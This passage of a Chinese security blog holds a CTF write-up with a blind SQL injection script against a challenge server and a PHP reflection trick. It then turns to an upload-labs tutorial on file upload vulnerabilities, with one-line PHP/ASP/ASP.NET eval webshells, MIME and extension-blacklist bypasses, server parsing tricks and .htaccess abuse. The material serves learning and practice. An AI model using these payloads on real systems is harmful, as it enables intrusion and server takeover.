class="keyword">in</span> re.text:</span><br><span class="line">            result += <span class="built_in">chr</span>(i)</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>得到两个表，users233333333333333,f1ag_1s_h3r3_hhhhh</p><p>由于过滤了join，无法知道列名，采用mysql字符串逐位比较来获取第二个表的内容。</p><p>判断表中有两个字段，猜测flag在第二列。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;2||((select 1)&gt;(select * from f1ag_1s_h3r3_hhhhh))      bool(false)</span><br><span class="line">id&#x3D;2||((select 1，1)&gt;(select * from f1ag_1s_h3r3_hhhhh))    Nu1l</span><br><span class="line">id&#x3D;2||((select 1,1,1)&gt;(select * from f1ag_1s_h3r3_hhhhh))   bool(false)</span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://ead240c2-1793-45a6-8939-a0db7ad04826.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        res += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    res = <span class="string">&#x27;0x&#x27;</span> + res</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload=<span class="string">&quot;2||((select 1,&#123;&#125;) &gt; (select * from f1ag_1s_h3r3_hhhhh))&quot;</span>.<span class="built_in">format</span>(str_hex(flag+<span class="built_in">chr</span>(j)))</span><br><span class="line">        <span class="comment">#payload=&quot;2||((select 1,(concat(&#123;&#125;,cast(0 as json)))) &gt; (select * from f1ag_1s_h3r3_hhhhh))&quot;.format(flag+chr(j))</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url=url,data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j-<span class="number">1</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> flag[-<span class="number">1</span>] ==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h2><p>wp参考 <a href="https://r0yanx.com/2020/10/28/fslh-writeup/">fslh-writeup</a></p><p>扫描后台目录得到index.php.swp，少见的备份文件格式，其是 vim 打开文件后的缓存文件<br>得到源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$c</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">h</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">j</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">k</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">m</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">p</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">q</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rc</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rc&quot;</span>];</span><br><span class="line"><span class="variable">$rb</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rb&quot;</span>];</span><br><span class="line"><span class="variable">$ra</span>=<span class="variable">$_GET</span>[<span class="string">&quot;ra&quot;</span>];</span><br><span class="line"><span class="variable">$rd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rd&quot;</span>];</span><br><span class="line"><span class="variable">$method</span>= <span class="keyword">new</span> <span class="variable">$rc</span>(<span class="variable">$ra</span>, <span class="variable">$rb</span>);</span><br><span class="line">var_dump(<span class="variable">$method</span>-&gt;<span class="variable">$rd</span>());</span><br></pre></td></tr></table></figure><p>分析题目，猜测 flag 是藏在类的注释中，我们能够实例化任意类，并调用类方法，那么就可以利用 PHP 内置类中的 <code>ReflectionMethod</code> 来读取 <code>User</code> 类里面各个函数的注释。</p><p>构造成题目中的 http 参数则是：<code>?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment</code></p><p>因为不知道是在哪个函数的注释中，所以逐个函数暴破，暴破 <code>rb</code> 的值 <code>a-z</code>，可以发现 <code>flag</code> 在 <code>q</code> 的注释中。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/1223846800.png" alt="1223846800"></p><p>其他题目质量很不错（爆0），根本没有思路，大佬的wp如下：</p><p><a href="http://www.xl-bit.cn/index.php/archives/434/">http://www.xl-bit.cn/index.php/archives/434/</a></p><p><a href="http://www.snowywar.top/?p=2190">http://www.snowywar.top/?p=2190</a></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>[1] <a href="https://www.anquanke.com/post/id/193512">聊一聊bypass information_schema</a></p><p>[2] <a href="https://www.136.la/mysql/show-47821.html">SQLi —— 逗号，空格，字段名过滤突破(示例代码)</a></p><p>[3] <a href="https://blog.csdn.net/weixin_45669205/article/details/116064642?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">[GYCTF2020]Ezsqli（Mysql逐位比较）</a></p>]]></content>
      
      
      <categories>
          
          <category> 赛题再现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> ciscn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞学习</title>
      <link href="posts/13382.html"/>
      <url>posts/13382.html</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传简介"><a href="#文件上传简介" class="headerlink" title="文件上传简介"></a>文件上传简介</h1><p>文件上传，顾名思义就是上传文件的功能行为。将客户端数据以文件形式封装，通过网络协议发送到服务器端。在服务器端解析数据，最终在服务端硬盘上作为真实的文件保存。</p><p><strong>漏洞产生原因</strong>：大部分的网站和应用系统都有上传功能，一些文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过 Web 访问的目录上传任意 PHP 文件，并能够将这些文件传递给 PHP 解释器，就可以在远程服务器上执行任意PHP脚本。另外，服务器配置不当、开源编辑器的上传漏洞、文件上传限制被绕过、文件解析漏洞导致文件执行等都有可能产生文件上传漏洞。</p><p><strong>漏洞危害</strong>:当系统存在文件上传漏洞时，攻击者可以将病毒，木马，WebShell，其他恶意脚本或者是包含了脚本的图片上传到服务器，服务器如果对其解析执行则会造成很大的危害。</p><blockquote><p>WebShell 就是以 asp、php、jsp 或者 cgi 等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些 asp 或 php 后门文件与网站服务器 web 目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。</p></blockquote><h1 id="绕过文件检测"><a href="#绕过文件检测" class="headerlink" title="绕过文件检测"></a>绕过文件检测</h1><p>通常一个文件以HTTP协议进行上传时，将以POST请求发送至Web服务器，Web服务器收到请求并同意后，用户与Web服务器将建立连接，并传输数据。一般一个文件上传过程中的<strong>检测方式</strong>有∶</p><ol><li>客户端JavaScript检测（检测文件扩展名）</li><li>服务端MIME类型检测（检测content-type内容)</li><li>服务端目录路径检测（检测跟path参数相关的内容)</li><li>服务端文件内容检测（检测内容是否合法或含有恶意代码）等。</li></ol><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210416130421578.png" alt="image-20210416130421578"></p><h2 id="绕过客户端检测"><a href="#绕过客户端检测" class="headerlink" title="绕过客户端检测"></a>绕过客户端检测</h2><p>原理：通常在上传页面里含有专门检测文件上传的JavaScript代码，最常见的就是检测文件类型和扩展名是否合法。</p><p>方法：在本地浏览器客户端禁用JS即可;可使用火狐浏览器的Noscript插件、IE中禁用JS等方式实现。</p><p>测试：upload-labs/Pass-01</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210415231636662.png" alt="image-20210415231636662"></p><p>这里的js检测文件的扩展名，只允许.jpg、.png、.gif文件上传。</p><p>但我们可以禁用此js，或者用burp抓包修改文件类型（上传1.jpg修改为1.php）</p><p>按照惯例，上传最简单的一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;upload&#x27;</span>]);    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210415233539502.png" alt="image-20210415233539502"></p><p>查看phpinfo()</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210415234903809.png" alt="image-20210415234903809"></p><p>上菜刀，可以看到整个网站的结构和文件，甚至是暴露了主机的磁盘存储！！可以进行任意非法增删查改！！网站（主机）至此沦陷……</p><blockquote><p>**”中国菜刀”**：仅需要一段简短的代码便可以管理网站。目前支持的服务器端脚本包括: php、ASP、ASP.NET、JSP等，并且支持HTTPS安全连接的网站。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP: &lt;?php @eval($_POST[&#39;mima&#39;]);?&gt;</span><br><span class="line">ASP: &lt;%eval request(&quot;mima&quot;)%&gt;</span><br><span class="line">ASP.NET &lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;mima&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210415234719164.png" alt="image-20210415234719164"></p><h2 id="绕过MIME类型检测"><a href="#绕过MIME类型检测" class="headerlink" title="绕过MIME类型检测"></a>绕过MIME类型检测</h2><p>原理：检测图片类型文件上传过程中http包的Content-Type字段的值，来判断上传文件是否合法。</p><p>绕过方法：用burpsuite截取并修改数据包中文件的content-type类型进行绕过。</p><p>常见MIME类型：</p><ul><li>html文件：text/html</li><li>txt文件：text/plain</li><li>pdf文档：application/pdf</li><li>word文件：application/msword</li><li>png图片：image/png</li><li>jpeg图片：image/jpeg</li><li>gif图片：image/gif</li></ul><p>测试：upload-labs/Pass-02</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210416132434036.png" alt="image-20210416132434036"></p><p>通过其源码发现仅仅判断content-type类型，因此上传1.php抓包修改content-type为图片类型：image/jpeg、image/png、image/gif</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210416132812123.png" alt="image-20210416132812123"></p><p>成功利用</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210416132939840.png" alt="image-20210416132939840"></p><h2 id="绕过黑名单检测"><a href="#绕过黑名单检测" class="headerlink" title="绕过黑名单检测"></a>绕过黑名单检测</h2><p>黑名单策略</p><p>文件扩展名在黑名单中为不合法，一般有个专门的blacklist文件，里面会包含常见的危险脚本文件。</p><p>绕过方法</p><p><strong>1.后缀大小写绕过</strong>：</p><p>在对后缀的判断中，如果只是对字符串进行单独的比较来判断是不是限制文件，可以采用后缀名大小写绕过形式。</p><p>测试：upload-labs/Pass-06</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418221001633.png" alt="image-20210418221001633"></p><p>这里对文件后缀进行了限制，但未对字母大小写做任何处理，可以大小写绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418221031495.png" alt="image-20210418221031495"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418221148741.png" alt="image-20210418221148741"></p><p><strong>2.空格绕过:</strong></p><p>如果黑名单没有对后缀名进行去空处理，可以通过在后缀名后加空进行绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p><strong>3.点绕过:</strong></p><p>如果黑名单没有对后缀名进行去.处理，利用Windows系统的文件名特性,会自动去掉后缀名最后的.，通过在文件名后加.进行绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br></pre></td></tr></table></figure><p>4.<code>::$DATA</code>绕过:</p><p>如果黑名单没有对后缀名进行去<code>::$DATA</code>处理，利用Windows下NTFS文件系统的一个特性（在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持”<code>::$DATA</code>“之前的文件名），可以在后缀名后加<code>::$DATA</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418225806235.png" alt="image-20210418225806235"></p><p><strong>5.双后缀名绕过:</strong></p><p>如果黑名单是将问题后缀名替换为空，可以利用双写绕过进行文件上传。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br></pre></td></tr></table></figure><p><strong>6.配合文件解析漏洞绕过:</strong></p><ol><li><p>IIS解析漏洞<br>在IIS6.0的情况下有三种可以利用的手段</p><ul><li>目录解析漏洞：建立<code>*.asa</code>、<code>*.asp</code>格式的文件夹时其目录下的文件都会当做asp文件解析。</li><li>当文件名为<code>*.asp;1.jpg</code>时，IIS会以ASP文件来解析，也就是说;起到了截断作用。</li><li>WebDav漏洞，借助put方法直接向服务器上传危险脚本</li></ul></li><li><p>Apache解析漏洞<br>在Apache 1.X与Apache 2.X中如果碰到文件名为<code>demo.php.test</code>的文件会按php文件进行解析，根据Apache的解析规则，如果碰到不认识的拓展名便会进行遍历，直到碰到能够解析的拓展名。</p><blockquote><p>在Apache根目录的coof/mime.types文件中有详细的可识别拓展名。</p></blockquote></li><li><p>Nginx解析漏洞</p></li></ol><p>在Nginx的服务器环境下，假如成功上传一张名为test.jpg的文件到网站根目录下，如果我们访问<code>www.demo.com/test.jpg/test.php</code>这个虚构的目录服务器则会直接将test.jpg作为php文件进行解析。</p><p><strong>7.htaccess绕过</strong></p><p>当上传<code>.htaccess</code>文件到网站目录时，该目录下的文件会按其配置生效解析。</p><p>条件</p><ul><li>apache服务器</li><li>能够上传.htaccess文件，一般为黑名单限制。</li><li>AllowOverride All（默认配置为关闭None）</li><li>LoadModule rewrite_module modules/mod_rewrite.so #rewrite模块为开启状态</li><li>上传目录具有可执行权限。</li></ul><p>测试：upload-labs/Pass-04</p><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span 